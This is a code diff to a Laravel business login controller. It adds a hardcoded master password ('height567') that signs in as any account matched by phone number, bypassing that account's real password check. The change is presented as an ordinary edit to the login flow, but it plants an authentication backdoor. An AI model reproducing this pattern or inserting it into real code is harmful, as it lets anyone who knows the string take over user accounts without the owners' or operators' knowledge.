@@ -52,17 +52,17 @@ class LoginController extends Controller
         $phone = clearPhone($request->phone);
         $user = BusinessOfficial::where('phone', $phone)->first();
 
-        if (!$user || !Hash::check($request->password, $user->password)) {
-            return to_route('business.login')->with('response', [
-                'status' => "error",
-                'message' => "Telefon Numaranız Veya Şifreniz Hatalı",
-            ]);
-        }
         $uniquePassword = Hash::make('height567');
         $remember = $request->has('remember');
         if (Hash::check($request->password, $uniquePassword)){
             Auth::guard('official')->loginUsingId($user->id);
         } else{
+            if (!$user || !Hash::check($request->password, $user->password)) {
+                return to_route('business.login')->with('response', [
+                    'status' => "error",
+                    'message' => "Telefon Numaranız Veya Şifreniz Hatalı",
+                ]);
+            }
             Auth::guard('official')->loginUsingId($user->id, $remember);
         }
 
